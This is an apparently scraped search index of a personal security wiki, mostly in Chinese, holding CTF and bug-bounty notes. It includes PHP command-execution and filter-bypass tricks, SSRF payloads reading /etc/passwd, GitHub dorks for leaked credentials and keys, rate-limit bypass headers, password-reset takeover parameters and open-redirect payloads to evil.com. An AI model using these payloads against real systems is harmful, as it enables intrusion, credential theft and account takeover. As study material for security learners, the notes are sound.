CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"CTF_Tools","date":"2021-04-23T08:48:56.000Z","path":"wiki/CTF-Tools/","text":"在线正则表达式 https://regex101.com/ CTF在线工具 http://ctf.ssleye.com/ js美化 https://beautifier.io/ 信息泄漏 查看常用CTF文件是否存在于网站中：https://github.com/WangYihang/SourceLeakHacker 常规git泄漏：https://github.com/BugScanTeam/GitHack","tags":[{"name":"Tools","slug":"Tools","permalink":"https://tsunamori.github.io/tags/Tools/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"}]},{"title":"CTF PHP","date":"2021-04-23T01:51:12.000Z","path":"wiki/CTF_PHP/","text":"PHP 变形绕过 ==比较双方都是数字或数字字符串（a string which can be interperted as int or float） var_dump(0 == “a”); // 0 == 0 -&gt; true var_dump(“1” == “01”); // 1 == 1 -&gt; true var_dump(“10” == “1e1”); // 10 == 10 -&gt; true var_dump(100 == “1e2”); // 100 == 100 -&gt; true 0==’0’ //true 0 == ‘abcdefg’ //true 0 === ‘abcdefg’ //false 1 == ‘1abcdef’ //true PHP Eval eval()内参数数目不限，彼此之间用分号隔开。 PHP 环境变量和系统变量 常用环境变量和系统变量： https://blog.csdn.net/liubing300/article/details/6883715 $GLOBALS:包含了全部变量的全局组合数组。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"错题wp集","date":"2021-04-22T06:57:37.000Z","path":"wiki/CTF_错题集/","text":"SUCTF 2019 EasySQL https://blog.csdn.net/qq_43619533/article/details/103434935 考点： 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有|| BugKu web 21 https://blog.csdn.net/qq_41333578/article/details/92759619 考点： 弱比较的绕过; PHP伪协议php://input如何输入请求主体; eregi绕过的两种方式; 注意\\x00会截断后续内容，而%00不会。 BugKu 冬至红包 https://blog.csdn.net/qq_46230755/article/details/112973722 考点： 新姿势 BugKu web18 https://ctf.bugku.com/challenges/detail/id/85.html 考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。12345678910111213141516171819202122232425import requestsfrom bs4 import BeautifulSoupurl &#x3D; &#39;http:&#x2F;&#x2F;114.67.246.176:14925&#x2F;&#39;s &#x3D; requests.session()r &#x3D; s.get(url)# 这里要根据网页的编码来设置解码，这个目标网站编码为&#39;utf-8&#39;r.encoding &#x3D; &#39;utf-8&#39;soup&#x3D;BeautifulSoup(r.text,&#39;lxml&#39;)data&#x3D;soup.select(&#39;div&#39;)for item in data: #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514&#x3D;?; result&#x3D;item.get_text()result1&#x3D;result[0:len(result)-3] #去掉后三位‘&#x3D;?;’result2 &#x3D; eval(result1) #计算数值result3&#x3D;&#123;&#39;value&#39;:result2&#125; #添加post请求数据格式mssg&#x3D;s.post(url, data&#x3D;result3) #利用同一个session，防止网页刷新。print(mssg.text)","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"JavaScript","date":"2021-04-22T06:33:21.000Z","path":"wiki/JavaScript/","text":"JavaScript原型链污染攻击https://xz.aliyun.com/t/7182","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"HTTP request","date":"2021-04-21T03:32:06.000Z","path":"wiki/HTTP-request/","text":"同时提交get和post请求： 链接上提供get请求参数，请求末尾加入post请求参数，发送的请求仍为post请求。 https://blog.csdn.net/qq_32642035/article/details/104747362 HTTP gzip: burp有自动解码gzip的功能。","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"CTF PHP-RCE","date":"2021-04-20T08:22:46.000Z","path":"wiki/CTF_PHP-RCE/","text":"文件包含 文件包含命令执行 https://xz.aliyun.com/t/5535 https://blog.csdn.net/nai_kai/article/details/106805220 PHP伪协议（php://） https://www.jianshu.com/p/0a8339fcc269 文件包含漏洞利用 https://blog.csdn.net/qq_32393893/article/details/110228864 远程文件包含漏洞（Remote File Inclusion RFI）: PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。 allow_url_fopen = On 是否允许打开远程文件; allow_url_include = On 是否允许include/require远程文件 远程文件包含webshell https://www.jianshu.com/p/be68cf9be911 RCE find the file by name in linux https://www.plesk.com/blog/various/find-files-in-linux-via-command-line/ https://www.linux.com/topic/desktop/how-search-files-linux-command-line/ 在不能直接获取文件时，使用php://filter/read=convert.base64-encode/resource=test.php绕过获取文件内容 如读取文件限制为：123456789 &lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; &#x2F;&#x2F;不能直接读取绝对路径 exit();&#125; include($file); &#x2F;&#x2F;include不能包含自身，会死循环，故拒绝访问。 命令执行绕过 https://blog.csdn.net/u014549283/article/details/81783164 https://zhuanlan.zhihu.com/p/127047303 https://www.codenong.com/cs110213257/ https://www.anquanke.com/post/id/208398 ${HOME:0:1} = / (获取目录分割符绕过过滤) https://www.cnblogs.com/Tkitn/p/11661017.html https://blog.csdn.net/qq_45927819/article/details/109671655 管道符（; | || &amp; &amp;&amp;）过滤绕过：换行符%0a 空格绕过：%20(目前做题最好使的一个绕过，&lt;&gt;经常不成功) 关键词绕过：引号需要每个字母之间添加引号’或”，加\\的话只需要加一个,cat可以用tac代替。 文件读取不能用cat的替代：show_source(‘flag.php’) Eval命令绕过利用，eval()内参数数目不限，彼此之间用分号隔开。 eval( “var_dump($a);”); -&gt; eval( “var_dump(1),system(‘ls’);”); Assert()命令执行漏洞： var_dump(vi flag.php) 不允许输入标点符号，只允许数字和大小写，读取文件：$$args -&gt; $args = GLOBALS Webshell RCE 绕过 https://xz.aliyun.com/t/8354 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 不包含字母和数字： https://cloud.tencent.com/developer/article/1186230 目录遍历 ../../etc/passwd https://www.freebuf.com/vuls/247620.html","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"useful books","date":"2021-04-15T01:56:37.000Z","path":"wiki/useful-books/","text":"Hack tricks https://book.hacktricks.xyz/ CTF-wiki https://ctf-wiki.org/ https://3wapp.github.io/WebSecurity","tags":[{"name":"Books","slug":"Books","permalink":"https://tsunamori.github.io/tags/Books/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"140 Books","slug":"100-Cyber-security/140-Books","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/140-Books/"}]},{"title":"XXE","date":"2021-04-14T08:32:38.000Z","path":"wiki/XXE/","text":"XXE methods https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods Learn XXE from zero to one https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"XSS","date":"2021-04-14T08:13:55.000Z","path":"wiki/XSS/","text":"XSS https://kathan19.gitbook.io/howtohunt/xss/xss automated XSS https://kathan19.gitbook.io/howtohunt/xss/automated_xss","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Weak password","date":"2021-04-14T08:10:29.000Z","path":"wiki/Weak-password/","text":"weak password policy https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"WAF bypasses","date":"2021-04-14T08:05:47.000Z","path":"wiki/WAF-bypasses/","text":"WAF bypass using headers(Password reset poisoning) https://kathan19.gitbook.io/howtohunt/waf-bypasses/waf_bypass_using_headers","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Tabnabbing","date":"2021-04-14T08:00:25.000Z","path":"wiki/Tabnabbing/","text":"https://kathan19.gitbook.io/howtohunt/tabnabbing/tabnabbing","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Subdomain takeover","date":"2021-04-14T07:40:42.000Z","path":"wiki/Subdomain-takeover/","text":"detail method https://kathan19.gitbook.io/howtohunt/subdomain-takeover/subdomain_takeover easy method https://kathan19.gitbook.io/howtohunt/subdomain-takeover/easy_methods","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Status code bypass","date":"2021-04-14T07:23:23.000Z","path":"wiki/Status-code-bypass/","text":"tips https://kathan19.gitbook.io/howtohunt/status-code-bypass/status_code_bypass 403 status code bypass https://kathan19.gitbook.io/howtohunt/status-code-bypass/403bypass","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Sensitive info leaks","date":"2021-04-14T06:42:34.000Z","path":"wiki/Sensitive-info-leaks/","text":"Github recon steps Check github with company name for API keys or passswords. Enumerate the employees of the company from linkedin and twitter and check their repositories on github for sensitive information. Check source code of main website and subdomains for github links in the html comments or anywhere. Search using ctl-F and search for keyword github tools https://github.com/BishopFox/GitGot https://github.com/hisxo/gitGraber https://github.com/tillson/git-hound https://securitytrails.com/blog/github-dorks Github dorks GitHub Dorks for Finding Files filename:manifest.xml filename:travis.yml filename:vim_settings.xml filename:database filename:prod.exs NOT prod.secret.exs filename:prod.secret.exs filename:.npmrc _auth filename:.dockercfg auth filename:WebServers.xml filename:.bash_history filename:sftp-config.json filename:sftp.json path:.vscode filename:secrets.yml password filename:.esmtprc password filename:passwd path:etc filename:dbeaver-data-sources.xml path:sites databases password filename:config.php dbpasswd filename:prod.secret.exs filename:configuration.php JConfig password filename:.sh_history shodan_api_key language:python filename:shadow path:etc JEKYLL_GITHUB_TOKEN filename:proftpdpasswd filename:.pgpass filename:idea14.key filename:hub oauth_token HEROKU_API_KEY language:json HEROKU_API_KEY language:shell SF_USERNAME salesforce filename:.bash_profile aws extension:json api.forecast.io filename:.env MAIL_HOST=smtp.gmail.com filename:wp-config.php extension:sql mysql dump filename:credentials aws_access_key_id filename:id_rsa or filename:id_dsaGitHub Dorks for Finding Languages language:python username language:php username language:sql username language:html password language:perl password language:shell username language:java api HOMEBREW_GITHUB_API_TOKEN language:shellGiHub Dorks for Finding API Keys, Tokens and Passwords api_key “api keys” authorization_bearer: oauth auth authentication client_secret api_token: “api token” client_id password user_password user_pass passcode client_secret secret password hash OTP user authGitHub Dorks for Finding Usernames user:name (user:admin) org:name (org:google type:users) in:login ( in:login) in:name ( in:name) fullname:firstname lastname (fullname: ) in:email (data in:email)GitHub Dorks for Finding Information using Dates created:&lt;2012–04–05 created:&gt;=2011–06–12 created:2016–02–07 location:iceland created:2011–04–06..2013–01–14 in:usernameGitHub Dorks for Finding Information using Extension extension:pem private extension:ppk private extension:sql mysql dump extension:sql mysql dump password extension:json [api.forecast.io] (http://api.forecast.io/) extension:json [mongolab.com] (http://mongolab.com/) extension:yaml [mongolab.com] (http://mongolab.com/) [WFClient] Password= extension:ica extension:avastlic “[support.avast.com] (http://support.avast.com/)” extension:json googleusercontent client_secret https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/github_dorks_all Google recon Google dorks https://kathan19.gitbook.io/howtohunt/sensitive-info-leaks/google_dorks Shodan recon Big IP shodan Search:-http.title:&quot;BIG-IP&amp;reg;-Redirect&quot; org:Org CVE 2020-3452http.html_hash:-628873716 “set-cookie: webvpn;” CVE CVE-2019-11510http.html:/dana-na/","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"SSTI","date":"2021-04-14T06:41:23.000Z","path":"wiki/SSTI/","text":"https://kathan19.gitbook.io/howtohunt/ssti/ssti","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"SSRF","date":"2021-04-14T06:20:24.000Z","path":"wiki/SSRF/","text":"SSRF https://kathan19.gitbook.io/howtohunt/ssrf/ssrf blind SSRF https://kathan19.gitbook.io/howtohunt/ssrf/blind_ssrf SSRF -&gt; getshell https://xz.aliyun.com/t/9371 SSRF伪协议： file:///,gopher://,ftp:// ref: https://www.cnblogs.com/-mo-/p/11673190.html https://xz.aliyun.com/t/7405#toc-1 https://www.secpulse.com/archives/70471.html dict://127.0.0.1:22/info 探测端口/redis等服务 ref:https://3wapp.github.io/WebSecurity/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE.html gopher://fuzz.wuyun.org:8080/gopher https://xz.aliyun.com/t/6993 file:///etc/passwd, file:///var/www/html/flag.php 例题： https://www.cnblogs.com/wangtanzhi/p/11900128.html https://times0ng.github.io/2019/02/14/%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AF%87%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/ redis SSRF: https://www.yuque.com/tianxiadamutou/od438i/ud5pu8?language=en-us","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"SQLI","date":"2021-04-14T06:17:04.000Z","path":"wiki/SQLI/","text":"https://kathan19.gitbook.io/howtohunt/sqli/sql_injection Cookie injection: can only works for sqlmap above level 2. eg:sqlmap –cookie=”hint=id; id=1” -u “http://“ -p id –level=2 Any other parameters needs to be forced, such as UA injection: user-agent=blabla* (–level 2) SQL injection through HTTP headers: https://resources.infosecinstitute.com/topic/sql-injection-http-headers/ (level 2 recommended as tried) Time-based blind injection: use thread=blabla to fasten it. https://www.freebuf.com/sectool/222967.html https://zhuanlan.zhihu.com/p/129904025 https://zhuanlan.kanxue.com/article-10333.htm","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Recon","date":"2021-04-14T06:16:25.000Z","path":"wiki/Recon/","text":"recon workflowhttps://kathan19.gitbook.io/howtohunt/recon/workflow subdomain enumerationhttps://kathan19.gitbook.io/howtohunt/recon/subdomain_enumeration 利用zoomeye发现后门设备 https://paper.seebug.org/1576/","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Rate limit","date":"2021-04-14T06:15:19.000Z","path":"wiki/Rate-limit/","text":"rate-limit bypass customizing HTTP methods change the GET request to POST, PUT, etc. bypassing rate-limit in API’s try HEAD method using header to bypass the rate limit(use the following just below the host header) 1234567891011X-Forwarded-For: IPX-Forwarded-IP: IPX-Client-IP: IPX-Remote-IP: IPX-Originating-IP: IPX-Host: IPX-Client: IP#or use double X-Forwarded-For headerX-Forwarded-For:X-Forwarded-For: IP addding headers to spoof IP add HTTP headers to spoof IP n evade detection 123456789101112X-Forwarded: 127.0.0.1X-Forwarded-By: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-For-Original: 127.0.0.1X-Forwarder-For: 127.0.0.1X-Forward-For: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For-Ip: 127.0.0.1X-Custom-IP-Authorization: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1 bypass rate limit using special characters adding null byte (%00) at the end of the email try add a space after the email (not encoded) other characters can be tried to bypass rate limit %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C add a slash (/) at the end of api endpointfromdomain.com/v1/login to domain.com/v1/login/eg: https://hackerone.com/reports/1067533 using IP rotate burp extensionother ref: https://kathan19.gitbook.io/howtohunt/rate-limit/ratelimitbypass","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Password reset functionality","date":"2021-04-14T06:14:26.000Z","path":"wiki/Password-reset-functionality/","text":"Mindmap https://kathan19.gitbook.io/howtohunt/password-reset-functionality/password_reset_functionality password reset token leakage Sent a password reset request using forget password Check your email Copy your reset page link and paste in another tab and make burp intercept on. Look for every request if you find similar token that is in reset link with other domain like: bat.bing.com or facebook.com Then there is reset password token leakage. account takeover by password reset functionality email= &#118;&#105;&#x63;&#x74;&#105;&#x6d;&#64;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;&amp;email=attacker@gmil.com email= &#x76;&#105;&#99;&#x74;&#x69;&#x6d;&#64;&#x67;&#x6d;&#97;&#105;&#108;&#46;&#x63;&#x6f;&#109;%20email=attacker@gmil.com email= &#118;&#105;&#99;&#x74;&#x69;&#x6d;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#99;&#111;&#109; |email=attacker@gmil.com email= &#118;&#105;&#x63;&#x74;&#x69;&#109;&#64;&#103;&#109;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;%0d%0acc:&#x61;&#x74;&#116;&#x61;&#x63;&#x6b;&#x65;&#114;&#64;&#x67;&#109;&#x69;&#108;&#46;&#x63;&#x6f;&#109; email= &#118;&#x69;&#99;&#x74;&#x69;&#x6d;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d;&amp;code= my password reset token","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Parameter pollution","date":"2021-04-14T06:13:48.000Z","path":"wiki/Parameter-pollution/","text":"Parameter pollution in social sharing buttons find a social sharing button n get the sharing link. modified it from https://taget.com/how-to-hunt to such as https://taget.com/how-to-hunt?&amp;u=https://attacker.com/vaya&amp;text=another_site:https://attacker.com/vaya click the share button n see if the attack website is in the sharing content","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Open redirection","date":"2021-04-14T06:12:51.000Z","path":"wiki/Open-redirection/","text":"find OpenRedirect trick steps create an acc, record the user profile link, logout n clean all the cookies. paste n visit the profile link, it may redirect u to the login like https://samplesite.me/login?next=accounts/profile or https://samplesite.me/login?retUrl=accounts/profile try to exploit the parameter by adding an external domain eg: https://samplesite.me/login?next=https://evil.com/ or https://samplesite.me/login?next=https://samplesite.me@evil.com/ #or https://targetweb.com?url=www.targetweb.com.attackersite.com (with created subdomain) (to beat the bad regex filter) else, try the XSS eg: https://samplesite.me/login?next=javascript:alert(1);//","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"OAuth","date":"2021-04-14T06:11:16.000Z","path":"wiki/OAuth/","text":"https://kathan19.gitbook.io/howtohunt/oauth/oauth","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Misconfigurations","date":"2021-04-14T06:10:28.000Z","path":"wiki/Misconfigurations/","text":"default credential n admin panel default credentials basicsdefault software configurations, ie.: 